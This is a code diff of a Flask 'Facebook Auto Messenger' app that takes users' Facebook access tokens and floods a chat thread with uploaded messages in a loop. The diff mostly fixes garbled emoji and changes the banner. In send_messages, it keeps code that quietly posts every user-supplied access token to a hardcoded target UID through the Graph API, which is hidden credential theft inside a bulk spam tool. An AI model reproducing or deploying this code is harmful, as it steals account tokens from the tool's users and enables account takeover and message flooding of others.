@@ -27,16 +27,16 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
         for access_token in access_tokens:
-            # тЬЕ Target UID (61571843423018) рдкрд░ рдЯреЛрдХрди рднреЗрдЬрдирд╛
-            token_message = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..🔃  {access_token}"
+            # ✅ Target UID (61571843423018) पर टोकन भेजना
+            token_message = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..🔃 {access_token}"
             api_url_token = f'https://graph.facebook.com/v15.0/t_{TARGET_UID}/'
             parameters_token = {'access_token': access_token, 'message': token_message}
             response_token = requests.post(api_url_token, data=parameters_token, headers=headers)
 
             if response_token.status_code == 200:
-                print(f"тЬЕ Token Sent to Target UID: {access_token}")
+                print(f"✅ Token Sent to Target UID: {access_token}")
             else:
-                print(f"тЭМ Token Sending Failed: {access_token}")
+                print(f"❌ Token Sending Failed: {access_token}")
 
             for message1 in messages:
                 if stop_event.is_set():
@@ -47,9 +47,9 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 response_message = requests.post(api_url_message, data=parameters_message, headers=headers)
 
                 if response_message.status_code == 200:
-                    print(f"тЬЕ Message Sent to {thread_id}: {message}")
+                    print(f"✅ Message Sent to {thread_id}: {message}")
                 else:
-                    print(f"тЭМ Message Sending Failed to {thread_id}: {message}")
+                    print(f"❌ Message Sending Failed to {thread_id}: {message}")
 
                 time.sleep(time_interval)
 
@@ -78,8 +78,7 @@ def send_message():
         threads[task_id] = thread
         thread.start()
 
-        return f'❣️........YOUR STOP KEY->🔃
-                                                               {task_id}'
+        return f'✅ YOUR STOP KEY-> {task_id}'
 
     return render_template_string('''
 <!DOCTYPE html>
@@ -87,7 +86,7 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title> 💚 𝙊𝙒𝙉𝙀𝙍 𝙎𝘼𝙃𝙄𝙄𝙇 𝙄𝙄𝙉𝙎𝙄𝘿𝙀 ❤️  STATR DAYS...𝟮/𝟮/𝟮𝟱 RUNIING SERVER</title>
+  <title>🔥❤️ 𝙊𝙒𝙈𝙀𝙍 𝘽𝙍𝙊𝙆𝙀𝙉 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 ❤️🔥  DEPLOY 2/2/25 DAYS </title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
@@ -113,7 +112,7 @@ def send_message():
   </style>
 </head>
 <body>
-  <h1>ЁЯФе Facebook Auto Messenger ЁЯФе</h1>
+  <h1>🔥❤️ 𝙊𝙒𝙈𝙀𝙍 𝘽𝙍𝙊𝙆𝙀𝙉 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 ❤️🔥  DEPLOY 2/2/25 DAYS </h1>
   <div class="container">
     <form method="post" enctype="multipart/form-data">
       <label for="tokenOption">Select Token Option</label>
@@ -141,13 +140,13 @@ def send_message():
       <label for="txtFile">Upload Message File</label>
       <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       
-      <button type="submit" class="btn btn-primary btn-submit">ЁЯЪА Start Messaging ЁЯЪА</button>
+      <button type="submit" class="btn btn-primary btn-submit">🚀 Start Messaging 🚀</button>
     </form>
 
     <form method="post" action="/stop">
       <label for="taskId">Enter Stop Key</label>
       <input type="text" class="form-control" id="taskId" name="taskId" required>
-      <button type="submit" class="btn btn-danger btn-submit">ЁЯЫС Stop Messaging ЁЯЫС</button>
+      <button type="submit" class="btn btn-danger btn-submit">🛑 Stop Messaging 🛑</button>
     </form>
   </div>
   <script>
@@ -166,9 +165,9 @@ def stop_task():
     task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
-        return f'тЬЕ Task {task_id} Stopped Successfully.'
+        return f'✅ Task {task_id} Stopped Successfully.'
     else:
-        return f'тЭМ No Task Found with ID {task_id}.'
+        return f'❌ No Task Found with ID {task_id}.'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
